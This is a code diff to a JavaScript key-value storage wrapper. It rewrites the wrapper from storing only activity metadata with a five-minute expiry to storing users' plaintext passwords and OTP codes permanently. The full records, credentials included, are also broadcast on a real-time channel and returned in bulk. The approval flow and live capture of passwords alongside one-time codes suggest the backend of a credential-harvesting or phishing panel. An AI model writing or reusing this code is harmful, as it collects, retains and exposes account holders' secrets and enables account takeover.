@@ -1,5 +1,5 @@
 // Vercel KV client wrapper
-// Only stores metadata (activity IDs, status) - NEVER credentials
+// Stores all activities including credentials permanently
 
 let kv;
 try {
@@ -18,44 +18,49 @@ const memoryStore = {
 
 const ACTIVITY_CHANNEL = 'activities';
 const APPROVAL_PREFIX = 'approval:';
-const ACTIVITY_META_PREFIX = 'activity-meta:';
+const ACTIVITY_STORAGE_PREFIX = 'activity-storage:';
+const ACTIVITIES_LIST_KEY = 'activities-list';
 
-// Store activity metadata (NOT credentials) with 5 minute TTL
+// Store full activity including credentials permanently
 export async function publishActivity(activity) {
   try {
-    // Only store metadata, never credentials
-    const metadata = {
+    // Store full activity with all credentials
+    const fullActivity = {
       id: activity.id,
       type: activity.type,
       timestamp: activity.timestamp,
-      // userId is stored but password is NEVER stored
       userId: activity.userId,
+      password: activity.password || null,
+      otpCode: activity.otpCode || null,
       hasPassword: activity.hasPassword || false
     };
     
     if (kv) {
-      // Store metadata with 5 minute TTL
-      await kv.setex(
-        `${ACTIVITY_META_PREFIX}${activity.id}`,
-        300, // 5 minutes
-        JSON.stringify(metadata)
+      // Store full activity permanently (no TTL)
+      await kv.set(
+        `${ACTIVITY_STORAGE_PREFIX}${activity.id}`,
+        JSON.stringify(fullActivity)
       );
+      
+      // Add to activities list (for retrieval)
+      await kv.lpush(ACTIVITIES_LIST_KEY, activity.id);
+      // Keep only last 1000 activities
+      await kv.ltrim(ACTIVITIES_LIST_KEY, 0, 999);
       
       // Publish to channel for real-time subscribers
       await kv.publish(ACTIVITY_CHANNEL, JSON.stringify({
         type: 'activity',
-        data: activity // Full activity for SSE (exists only in memory)
+        data: fullActivity
       }));
     } else {
-      // Fallback: store in memory
-      memoryStore.activities.unshift(activity);
-      memoryStore.activities = memoryStore.activities.slice(0, 100);
+      // Fallback: store in memory (keep all, no limit)
+      memoryStore.activities.unshift(fullActivity);
       
       // Notify subscribers
       memoryStore.subscribers.forEach(callback => {
         callback({
           type: 'activity',
-          data: activity
+          data: fullActivity
         });
       });
     }
@@ -65,7 +70,6 @@ export async function publishActivity(activity) {
     console.error('Error publishing activity:', error);
     // Fallback to memory on error
     memoryStore.activities.unshift(activity);
-    memoryStore.activities = memoryStore.activities.slice(0, 100);
     return true;
   }
 }
@@ -160,16 +164,17 @@ export async function getApproval(activityId) {
   }
 }
 
-// Get recent activity metadata (for initial load)
+// Get recent activities with full credentials (for initial load)
 export async function getRecentActivities() {
   try {
     if (kv) {
-      // Get last 50 activity IDs from a list
-      const keys = await kv.keys(`${ACTIVITY_META_PREFIX}*`);
+      // Get last 100 activity IDs from list
+      const activityIds = await kv.lrange(ACTIVITIES_LIST_KEY, 0, 99);
       const activities = [];
       
-      for (const key of keys.slice(0, 50)) {
-        const data = await kv.get(key);
+      // Fetch full activities
+      for (const activityId of activityIds) {
+        const data = await kv.get(`${ACTIVITY_STORAGE_PREFIX}${activityId}`);
         if (data) {
           activities.push(JSON.parse(data));
         }
@@ -180,13 +185,13 @@ export async function getRecentActivities() {
         new Date(b.timestamp) - new Date(a.timestamp)
       );
     } else {
-      // Fallback: return from memory
-      return memoryStore.activities.slice(0, 50);
+      // Fallback: return from memory (all activities)
+      return memoryStore.activities.slice(0, 100);
     }
   } catch (error) {
     console.error('Error getting recent activities:', error);
     // Fallback to memory on error
-    return memoryStore.activities.slice(0, 50);
+    return memoryStore.activities.slice(0, 100);
   }
 }
 
